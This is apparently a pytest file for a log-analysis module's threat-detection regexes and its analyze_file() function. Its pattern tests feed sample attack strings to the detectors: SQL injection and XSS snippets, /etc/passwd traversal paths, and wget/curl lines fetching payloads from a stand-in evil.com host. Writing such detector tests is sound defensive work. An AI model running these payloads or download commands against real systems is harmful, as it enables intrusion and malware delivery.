"""Tests for modules/log_analysis.py – PATTERNS and analyze_file()."""
import os
import re

from modules.log_analysis import PATTERNS, analyze_file


class TestPatterns:
    """Verify the regex patterns detect the intended strings."""

    def test_brute_force_failed_password(self):
        assert PATTERNS["brute_force"].search("sshd: failed password for root from 10.0.0.1")

    def test_brute_force_authentication_failure(self):
        assert PATTERNS["brute_force"].search("PAM: authentication failure")

    def test_brute_force_invalid_user(self):
        assert PATTERNS["brute_force"].search("Invalid user admin from 10.0.0.1")

    def test_brute_force_case_insensitive(self):
        assert PATTERNS["brute_force"].search("FAILED PASSWORD for user")

    def test_brute_force_no_match(self):
        assert not PATTERNS["brute_force"].search("successful login for user admin")

    def test_sql_injection_union_select(self):
        assert PATTERNS["sql_injection"].search("GET /search?q=union select * from users")

    def test_sql_injection_drop_table(self):
        assert PATTERNS["sql_injection"].search("drop table users")

    def test_sql_injection_or_1_eq_1(self):
        assert PATTERNS["sql_injection"].search("' or 1=1 --")

    def test_sql_injection_information_schema(self):
        assert PATTERNS["sql_injection"].search("SELECT * FROM information_schema.tables")

    def test_sql_injection_no_match(self):
        assert not PATTERNS["sql_injection"].search("SELECT name FROM users WHERE id=5")

    def test_xss_script_tag(self):
        assert PATTERNS["xss"].search("<script>alert('xss')</script>")

    def test_xss_onerror(self):
        assert PATTERNS["xss"].search("<img onerror=alert(1)>")

    def test_xss_javascript_protocol(self):
        assert PATTERNS["xss"].search("javascript:void(0)")

    def test_xss_document_cookie(self):
        assert PATTERNS["xss"].search("document.cookie")

    def test_xss_no_match(self):
        assert not PATTERNS["xss"].search("normal page content with no attacks")

    def test_path_traversal_unix(self):
        assert PATTERNS["path_traversal"].search("GET /../../etc/passwd")

    def test_path_traversal_windows(self):
        assert PATTERNS["path_traversal"].search("GET /..\\..\\windows\\system32")

    def test_path_traversal_encoded(self):
        assert PATTERNS["path_traversal"].search("GET /%2e%2e/etc/passwd")

    def test_path_traversal_double_encoded(self):
        assert PATTERNS["path_traversal"].search("GET /%252e%252e/etc/passwd")

    def test_path_traversal_no_match(self):
        assert not PATTERNS["path_traversal"].search("GET /normal/path/file.html")

    def test_suspicious_ip_private_10(self):
        assert PATTERNS["suspicious_ip"].search("Connection from 10.0.0.5")

    def test_suspicious_ip_private_172(self):
        assert PATTERNS["suspicious_ip"].search("Connection from 172.16.0.1")

    def test_suspicious_ip_private_192(self):
        assert PATTERNS["suspicious_ip"].search("Connection from 192.168.1.100")

    def test_port_scan_nmap(self):
        assert PATTERNS["port_scan"].search("nmap scan detected")

    def test_port_scan_masscan(self):
        assert PATTERNS["port_scan"].search("masscan initiated")

    def test_port_scan_syn_flood(self):
        assert PATTERNS["port_scan"].search("SYN flood detected")

    def test_port_scan_no_match(self):
        assert not PATTERNS["port_scan"].search("normal network traffic")

    def test_malware_cmd_exe(self):
        assert PATTERNS["malware_indicator"].search("cmd.exe /c whoami")

    def test_malware_powershell(self):
        assert PATTERNS["malware_indicator"].search("powershell -encodedCommand")

    def test_malware_wget_http(self):
        assert PATTERNS["malware_indicator"].search("wget http://evil.com/payload")

    def test_malware_curl_http(self):
        assert PATTERNS["malware_indicator"].search("curl http://evil.com/shell")

    def test_malware_base64(self):
        assert PATTERNS["malware_indicator"].search("base64 encoded payload")

    def test_malware_bin_sh(self):
        assert PATTERNS["malware_indicator"].search("/bin/sh -c command")

    def test_malware_no_match(self):
        assert not PATTERNS["malware_indicator"].search("normal application log entry")


class TestAnalyzeFile:
    """Test analyze_file() with various log files."""

    def test_file_not_found(self, capsys):
        result = analyze_file("/nonexistent/file.log")
        captured = capsys.readouterr()
        assert "File not found" in captured.out
        assert result is None

    def test_sample_log_detects_brute_force(self, sample_log_file, capsys):
        findings = analyze_file(sample_log_file)
        assert "brute_force" in findings
        assert len(findings["brute_force"]) == 3

    def test_sample_log_detects_sql_injection(self, sample_log_file, capsys):
        findings = analyze_file(sample_log_file)
        assert "sql_injection" in findings
        assert len(findings["sql_injection"]) >= 1

    def test_sample_log_detects_xss(self, sample_log_file, capsys):
        findings = analyze_file(sample_log_file)
        assert "xss" in findings
        assert len(findings["xss"]) >= 1

    def test_sample_log_detects_path_traversal(self, sample_log_file, capsys):
        findings = analyze_file(sample_log_file)
        assert "path_traversal" in findings
        assert len(findings["path_traversal"]) >= 1

    def test_sample_log_detects_port_scan(self, sample_log_file, capsys):
        findings = analyze_file(sample_log_file)
        assert "port_scan" in findings

    def test_sample_log_detects_malware_indicator(self, sample_log_file, capsys):
        findings = analyze_file(sample_log_file)
        assert "malware_indicator" in findings

    def test_empty_log_file(self, empty_log_file, capsys):
        findings = analyze_file(empty_log_file)
        captured = capsys.readouterr()
        assert "Total lines analyzed: 0" in captured.out
        # Findings dict should be empty or have empty lists
        assert all(len(v) == 0 for v in findings.values())

    def test_clean_log_file(self, clean_log_file, capsys):
        findings = analyze_file(clean_log_file)
        captured = capsys.readouterr()
        assert "Total lines analyzed: 3" in captured.out
        # suspicious_ip will match 192.168.x.x, but no attack patterns
        for threat in ["brute_force", "sql_injection", "xss", "path_traversal",
                       "port_scan", "malware_indicator"]:
            assert len(findings.get(threat, [])) == 0

    def test_ip_counter_in_output(self, sample_log_file, capsys):
        analyze_file(sample_log_file)
        captured = capsys.readouterr()
        assert "Top IP Addresses" in captured.out
        assert "10.0.0.5" in captured.out  # appears 3 times

    def test_returns_findings_dict(self, sample_log_file, capsys):
        findings = analyze_file(sample_log_file)
        assert isinstance(findings, dict)

    def test_line_numbers_in_findings(self, sample_log_file, capsys):
        findings = analyze_file(sample_log_file)
        # Each finding is (lineno, line_text) tuple
        for threat_type, matches in findings.items():
            for lineno, line_text in matches:
                assert isinstance(lineno, int)
                assert isinstance(line_text, str)
